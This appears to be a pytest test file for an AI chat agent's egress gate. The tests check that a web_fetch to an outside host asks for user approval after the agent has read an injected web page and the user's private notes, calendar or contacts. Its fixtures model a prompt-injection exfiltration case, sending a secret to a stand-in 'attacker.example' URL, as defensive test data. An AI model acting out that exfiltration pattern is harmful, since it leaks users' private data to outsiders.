"""The egress gate's private leg covers every private read (2026-10-13 user
decision, ADR 0002 amendment): the read actions of the manage_* tools, the
session/contact/account listers and GET raw API calls, not only email,
chat search and vault."""

import json

import pytest

import src.tool_security as tool_security
from src.chat_agent import permissions
from src.chat_agent.permissions import ALLOW, ASK, Provenance, Rules
from src.chat_agent.routing import ComposerToggles


@pytest.fixture(autouse=True)
def admin(monkeypatch):
    monkeypatch.setattr(tool_security, "owner_is_admin_or_single_user", lambda owner: True)


def _decide(name, content, provenance):
    toggles = ComposerToggles(mode="agent", allow_bash="true", allow_web_search="true", use_web=None,
                              plan_mode=False, incognito=False, workspace=None)
    layers = permissions.build_deny_layers(
        owner="alice", toggles=toggles, privileges={}, delegated_credential=False,
        active_email_open=False, global_disabled_tools=[], rules=Rules(),
    )
    return permissions.decide(layers, name, content, provenance=provenance, owner="alice").outcome


def _run(*calls):
    provenance = Provenance()
    for name, arguments in calls:
        provenance = provenance.after(name, json.dumps(arguments))
    return provenance


_PAGE = ("web_fetch", {"url": "https://injected.example/page"})
_OUTSIDE = json.dumps({"url": "https://attacker.example/?q=secret"})


def test_an_injected_page_then_a_notes_list_then_an_outside_fetch_asks():
    provenance = _run(_PAGE, ("manage_notes", {"action": "list"}))
    assert _decide("web_fetch", _OUTSIDE, provenance) == ASK


def test_a_spam_scan_then_a_calendar_list_then_a_fetch_asks():
    provenance = _run(("scan_spam", {}), ("manage_calendar", {"action": "list"}))
    assert _decide("web_fetch", _OUTSIDE, provenance) == ASK


def test_pure_research_still_never_asks():
    provenance = _run(("web_search", {"query": "q"}), _PAGE)
    assert _decide("web_fetch", _OUTSIDE, provenance) == ALLOW


def test_a_notes_read_then_a_web_search_does_not_ask():
    provenance = _run(("manage_notes", {"action": "list"}))
    assert _decide("web_search", json.dumps({"query": "q"}), provenance) == ALLOW
    # The search result is external content, but nothing has gone out yet.
    provenance = provenance.after("web_search", json.dumps({"query": "q"}))
    assert (provenance.external, provenance.private) == (True, True)


@pytest.mark.parametrize(("name", "arguments"), [
    ("manage_notes", {"action": "list"}),
    ("manage_notes", {"action": "search", "query": "x"}),
    ("manage_calendar", {"action": "list_events"}),
    # manage_calendar's executor default is list_events.
    ("manage_calendar", {}),
    ("manage_memory", {"action": "search", "query": "x"}),
    ("manage_contact", {"action": "find", "name": "Ann"}),
    ("manage_documents", {"action": "read", "id": "1"}),
    ("list_sessions", {}),
    ("resolve_contact", {"name": "Ann"}),
    ("list_email_accounts", {}),
    ("mcp__email__list_email_accounts", {}),
    ("app_api", {"action": "call", "method": "GET", "path": "/api/notes"}),
    ("api_call", {"integration": "crm", "method": "GET", "path": "/contacts"}),
])
def test_private_reads_arm_the_private_leg(name, arguments):
    assert Provenance().after(name, json.dumps(arguments)).private is True


@pytest.mark.parametrize(("name", "content"), [
    # Odysseus-data writes bring nothing private back.
    ("manage_notes", json.dumps({"action": "add", "title": "x"})),
    ("manage_calendar", json.dumps({"action": "create_event", "title": "x"})),
    ("manage_memory", "add\nlikes tea"),
    # Raw API writes ask on their own (sensitive); they are not a read.
    ("app_api", json.dumps({"action": "call", "method": "POST", "path": "/api/gallery/albums"})),
    # Workspace and web reads are not the user's private data.
    ("read_file", "notes.md"),
    ("web_search", json.dumps({"query": "q"})),
    # Custom MCP tools stay the external leg only (ADR 0002 source table).
    ("mcp__github__list_issues", "{}"),
])
def test_other_calls_leave_the_private_leg_alone(name, content):
    assert Provenance().after(name, content).private is False


def test_an_earlier_turn_s_notes_read_counts_from_its_tool_event():
    rows = [{"role": "assistant", "metadata": {"tool_events": [
        {"tool": "manage_notes", "command": json.dumps({"action": "list"})},
        {"tool": "web_fetch", "command": json.dumps({"url": "https://injected.example"})},
    ]}}]
    provenance = Provenance().after_history(rows)
    assert (provenance.external, provenance.private) == (True, True)
    assert _decide("web_fetch", _OUTSIDE, provenance) == ASK


def test_an_earlier_turn_s_notes_write_does_not_count():
    rows = [{"role": "assistant", "metadata": {"tool_events": [
        {"tool": "manage_notes", "command": json.dumps({"action": "add", "title": "x"})},
    ]}}]
    assert Provenance().after_history(rows).private is False
